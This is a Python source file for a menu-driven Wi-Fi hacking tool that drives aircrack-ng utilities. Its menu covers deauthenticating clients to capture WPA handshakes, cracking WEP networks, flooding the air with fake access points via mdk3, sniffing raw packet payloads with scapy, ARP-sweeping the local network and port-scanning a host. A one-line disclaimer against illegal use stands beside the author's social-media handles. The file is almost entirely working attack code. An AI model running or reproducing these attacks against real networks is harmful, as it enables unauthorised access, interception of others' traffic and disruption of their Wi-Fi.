from scapy.all import *  # for sniff wifi ...
from colorama import Fore  # for color ...
from time import sleep
from scapy.all import ARP , Ether, srp
from wifi_hack import ban


def slowly(slows):
    for str in ' ' * 8 + slows + " \n":
        print(str, end="", flush=True)
        sleep(0.5 / 100)

slowly('''
 __     __     __     ______   __    
/\ \  _ \ \   /\ \   /\  ___\ /\ \   
\ \ \/ ".\ \  \ \ \  \ \  __\ \ \ \  
 \ \__/".~\_\  \ \_\  \ \_\    \ \_\ 
  \/_/   \/_/   \/_/   \/_/     \/_/ 

     # ############# FOLLOW ME ###############
     # instagram ---> @d_5tr                 #
     # team ---> @zer0one_01                 #
     # telegram ---> https://t.me/d5tr_cyber #
     ######################################### 
--------------------------------------------------------|
                                                        |
don't use tool In illegal things !!                     | 
                                                        | 
this tool for wifi only !!                              |
                                                        |
Don't forget a you must be root !!                      | 
                                                        |
enjoy ...                                               |
                                                        |
--------------------------------------------------------|


''')



# if root or not :
root = os.getuid()

time.sleep(1)

if root == 0:
    pass

else:
    print('[!!] Error : you must be root !! \n use " sudo su " and type password next step run tool ')
    exit()

os.system('clear')


def d5tr(): # banaer ...
    ban.bans()




    import inquirer
    questions = [
        inquirer.List('size',
                      message="Choose Number ",
                      choices=[1, 2, 3, 4, 5, 6, 7, 99],
                      ),
    ]
    what = inquirer.prompt(questions)

    if what['size'] == 1:  # handshake = this can get password wifi with wirsharck ...

        try:
            os.system('airmon-ng start wlan0')  # start wlan0

            os.system('airodump-ng wlan0mon')  # start see wi-fi

            if KeyboardInterrupt:
                bssid = input('[X] Enter Bssid :')  # for next step
                chn = int(input('[X] Enter Chnnal :'))  # ++
                os.system('airodump-ng wlan0mon -d ' + bssid)  # to see anyone connct with wi-fi
                if KeyboardInterrupt:

                    os.system(
                        f"xterm -hold -e airodump-ng -w hack1 -c {chn} --bssid {bssid} wlan0mon & xterm -hold -e aireplay-ng --deauth 0 -a {bssid} wlan0mon ")  # this for open termnal and type ...

                    if KeyboardInterrupt:  # if exit return to the beginning
                        os.system('airmon-ng stop wlan0mon')  # stop wlan0

                        clear = input('[X] Do You Went Clear ? [ Y , N ] :')
                        if clear == 'Y':
                            print('clear now ...')
                            time.sleep(0.5)
                            os.system('clear')
                        d5tr()
        except:
            print('plz be root !!')

#-----------------------------------------------------------------------------#

    elif what['size'] == 2:  # sniff wifi

        wlan = input('[X] Enter number wifi ( wlan[?] ):')

        wlan_is = 'wlan' + str(wlan)

        def analyzer(pkt):  # for TCP ...
            if pkt.haslayer(TCP):
                print("===============================")
                print(Fore.RED + "<<<  TCP  >>>")
                src_ip = pkt[IP].src  # الايبي
                dst_ip = pkt[IP].dst
                mac_src = pkt.src  # الماك ادرس
                mac_dst = pkt.dst
                src_port = pkt.sport  # البورت الي طلع منه
                dst_port = pkt.dport
                print("mac_src = " + mac_src)
                print("mac_dst = " + mac_dst)
                print("+")
                print("src = " + src_ip)
                print("dst = " + dst_ip)
                print("+")
                print("src_port = " + str(src_port))
                print("dst_port = " + str(dst_port))
                if pkt.haslayer(Raw):
                    print(pkt[Raw].load)  # for print the pkt !!
                print("packet_size = " + str(len(pkt[TCP])))
                print("================================")
            elif pkt.haslayer(UDP):  # for UDP ...
                print("================================")
                print(Fore.LIGHTBLUE_EX + "<<<  UDP  >>>")
                src_ip = pkt[IP].src
                dst_ip = pkt[IP].dst
                mac_src = pkt.src
                mac_dst = pkt.dst
                src_port = pkt.sport  # البورت الي طلع منه
                dst_port = pkt.dport
                print("mac_src = " + mac_src)
                print("mac_dst =" + mac_dst)
                print("+")
                print("src_ip = " + src_ip)
                print("dst_ip = " + dst_ip)
                print("+")
                print("src_port = " + str(src_port))
                print("dst_port = " + str(dst_port))
                if pkt.haslayer(Raw):
                    print(pkt[Raw].load)
                print("packet_size = " + str(len(pkt[UDP])))
                print("===============================")

        print("*********START*********")
        sniff(iface=wlan_is, prn=analyzer)

# -----------------------------------------------------------------------------#

        if KeyboardInterrupt:
            clear = input('[X] Do You Went Clear ? [ Y , N ] :')
            if clear == 'Y':
                print('clear now ...')
                time.sleep(0.5)
                os.system('clear')

            d5tr()  # back

    elif what['size'] == 3: # know with you


        exitx = []
        ip_un = int(input('[X] Enter Number 192.168.[?].1 :'))

        def scan(ip):
            print('IP\t\t\t\t\tMAC')
            print('---------------------------------------------------------')
            while True:
                arp_req = ARP(pdst=ip)  #
                brod = Ether(dst='ff:ff:ff:ff:ff:ff')
                arp_brod = brod / arp_req
                result = srp(arp_brod, timeout=3, verbose=False)[0]
                lst = []
                for element in result:
                    cli = {'ip': element[1].psrc, 'mac': element[1].hwsrc}
                    lst.append(cli)
                for i in lst:
                    if i['mac'] not in exitx:
                        print('{}\t\t\t\t{}'.format(i['ip'], i['mac']))
                        exitx.append(i['mac'])


        ip_plus = f'192.168.{ip_un}.1/24'
        scan(ip_plus)

        if exit or KeyboardInterrupt:
            clear = input('Do you Went clear ? [ Y , N ] :')
            if clear == 'Y':
                print('clear now ...')
                time.sleep(0.5)
                os.system('clear')
            d5tr()

# -----------------------------------------------------------------------------#

    elif what['size'] == 4:  # port scan
        host = input('[X] Enter IP : ')
        numberx = 0
        try:
            for port in range(1, 65535):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                socket.setdefaulttimeout(1)
                result = s.connect_ex((host, port))  # scan
                numberx = numberx+1
                print(f'\r ports scan : {numberx}',end="")
                if result == 0:
                    def non():
                        print('------------------------------')

                    name_port = socket.getservbyport(port)  # get name port
                    print(f"[X] port {port} / {name_port} open  ")
                    non()



        except:
            print("Error : can't scan ip or wifi can't scan !!")

        if KeyboardInterrupt:
            clear_4 = input('[X] Do you went clear ? [ Y , N ] :')

            if clear_4 == 'Y':
                print('clear now ...')
                time.sleep(0.5)
                os.system('clear')
            d5tr()

# -----------------------------------------------------------------------------#

    elif what['size'] == 5: # fake WI-FI

        try:
            os.system('airmon-ng start wlan0')


            print(Fore.RED+'plz make sure you have file like [ wifi.lst ] ... !')
            time.sleep(3)

            name_wifi_file = input('[X] Enter Name wifi file or path :')
            print('----------START-FAKE-WI-FI-----------')

            os.system(f'mdk3 wlan0mon b -c 1 -f {name_wifi_file}') # for start wifi fake ... !



            if KeyboardInterrupt :
                print('clear now ...')
                time.sleep(0.5)
                os.system('clear')
                d5tr()




        except:
            print('Error !!')

# -----------------------------------------------------------------------------#

    elif what['size'] == 6: # hack wep only
        try:
            os.system('airmon-ng start wlan0')

            os.system('airodump-ng wlan0mon --encrypt WEP') # to see only wep wifi

            if KeyboardInterrupt:
                ch = input('[X] Enter CH :')
                bssid_network = input('[X] Enter Bssid :')
                os.system(f'besside-ng wlan0mon -c {ch} -b {bssid_network}') # to attack !!
                os.system('aircrack-ng ./wep.cap') # to see password ...

                if KeyboardInterrupt :
                    print('clear now ...')
                    time.sleep(0.5)
                    os.system('clear')
                    d5tr()

        except:
            print('Error !!')

# -----------------------------------------------------------------------------#

    elif what['size'] == 7: # handshake WPA only ...
        try:
            os.system('airmon-ng start wlan0')  # start wlan0

            os.system('airodump-ng wlan0mon --encrypt WPA')  # start see wi-fi WPA

            if KeyboardInterrupt:
                bssid = input('[X] Enter Bssid :')  # for next step
                chn = int(input('[X] Enter Chnnal :'))  # ++
                os.system('airodump-ng wlan0mon -d ' + bssid)  # to see anyone connct with wi-fi
                if KeyboardInterrupt:

                    os.system(
                        f"xterm -hold -e airodump-ng -w hack1 -c {chn} --bssid {bssid} wlan0mon & xterm -hold -e aireplay-ng --deauth 0 -a {bssid} wlan0mon ")  # this for open termnal and type ...

                    if KeyboardInterrupt:  # if exit return to the beginning
                        os.system('airmon-ng stop wlan0mon')  # stop wlan0

                        clear = input('[X] Do You Went Clear ? [ Y , N ] :')
                        if clear == 'Y':
                            print('clear now ...')
                            time.sleep(0.5)
                            os.system('clear')
                        d5tr()
        except:
            pass










    elif what['size'] == 99:  # exit !!
        print('GOOD BAY ...')
        exit()


# start the tool ...
d5tr()